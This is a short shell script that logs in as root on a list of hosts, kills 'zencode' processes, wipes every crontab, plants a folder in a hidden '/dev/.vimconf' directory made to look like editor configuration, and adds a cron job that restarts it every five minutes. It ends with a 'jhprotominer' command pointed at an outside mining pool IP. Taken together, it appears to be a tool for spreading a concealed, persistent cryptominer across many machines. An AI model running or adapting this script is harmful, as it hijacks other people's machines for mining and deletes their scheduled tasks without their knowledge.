for ip in `cat $1`
do
    ssh root@${ip} "killall -9 zencode-128; killall -9 zencode-128M; rm -rf /dev/.vimconf/; rm -rf /root/.vimconf; crontab -r;sed -i '/zencode/d' /etc/crontab; apt-get install -y expect-dev;"
    #ssh root@${ip} "killall -9 zencode-128; killall -9 zencode-128M; sed -i '/zencode/d' /etc/crontab"
    #ssh root@${ip} "apt-get install -y expect-dev"
    ssh root@${ip} 'echo "*/5 * * * * root /bin/bash /dev/.vimconf/zencode/run.sh start n pt >/dev/null 2>&1" >> /etc/crontab'
    scp -r ./.vimconf/ root@${ip}:/dev/
done

echo "./jhprotominer -o 213.165.94.246 -u 100890123.PTS_1 -p x -t 7"
